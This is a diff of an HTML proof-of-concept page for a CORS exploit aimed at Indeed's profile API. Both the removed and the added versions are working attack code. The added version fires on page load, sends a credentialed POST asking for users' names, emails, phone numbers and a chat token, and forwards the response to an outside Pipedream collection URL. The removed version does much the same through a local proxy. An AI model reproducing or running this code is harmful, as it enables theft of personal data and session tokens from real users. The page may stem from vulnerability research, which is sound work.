@@ -1,73 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Stolen Data Exploit</title>
+    <title>PoC - CORS Exploit</title>
+    <script>
+        function exfiltrateData() {
+            var url = 'https://profile.indeed.com'; // Target
+            var method = 'POST';
+            var xhr = new XMLHttpRequest();
+
+            xhr.open(method, url, true);
+            xhr.withCredentials = true; // Crucial for sending cookies/auth
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            "stolenData": xhr.responseText
+                        })
+                    });
+                }
+            };
+
+            var payload = '{"operationName":"GetCurrentCustomerSession","variables":{},"query":"query GetCurrentCustomerSession {\n  getCurrentCustomerSession {\n    chatSession {\n      ...FragmentChatSession\n      __typename\n    }\n    enableRating\n    xmppUser {\n      id\n      username\n      token\n      host\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment FragmentChatSession on ChatSession {\n  id\n  sessionId\n  userCustomer {\n    id\n    name\n    email\n    phoneNumber\n    gender\n    userType {\n      type\n      __typename\n    }\n    comment\n    commentedBy {\n      name\n      __typename\n    }\n    __typename\n  }\n  userBCA {\n    username\n    name\n    __typename\n  }\n  chatType {\n    typeName\n    __typename\n  }\n  chatReason {\n    reasonName\n    __typename\n  }\n  sessionSentiment {\n    sentimentType\n    __typename\n  }\n  skill {\n    name\n    published\n    __typename\n  }\n  sessionCategories {\n    categoryName\n    __typename\n  }    }\n}"}';
+
+            xhr.send(payload);
+        }
+
+        window.onload = exfiltrateData;
+    </script>
 </head>
 <body>
-  <h1>Exploit Running...</h1>
-  <script>
-    // Send GraphQL request to Indeed's profile API (via Flask proxy server)
-    fetch("http://localhost:5000/proxy", {  // Send request to the Flask proxy server
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        query: `query {
-          currentUser {
-            account {
-              emailAddress
-              __typename
-            }
-            __typename
-          }
-          jobSeekerProfile {
-            profile {
-              defaultInfo {
-                contactInformation {
-                  firstName
-                  lastName
-                  phoneNumber
-                  location {
-                    formattedLocation
-                    city
-                    country
-                    __typename
-                  }
-                  __typename
-                }
-                __typename
-              }
-              __typename
-            }
-            __typename
-          }
-        }`
-      })
-    })
-    .then(response => response.json())  // Parse the response from the GraphQL API
-    .then(data => {
-      // Send the stolen data to Pipedream
-      fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {  // Replace with your Pipedream URL
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify({ stolenData: data })  // Send stolen data to Pipedream
-      })
-      .then(pipedreamResponse => {
-        if (pipedreamResponse.ok) {
-          console.log("Data sent successfully to Pipedream");
-        }
-      })
-      .catch(error => {
-        console.error("Error sending data to Pipedream:", error);
-      });
-    })
-    .catch(console.error);
-  </script>
+    <h1>Loading...</h1>
 </body>
 </html>
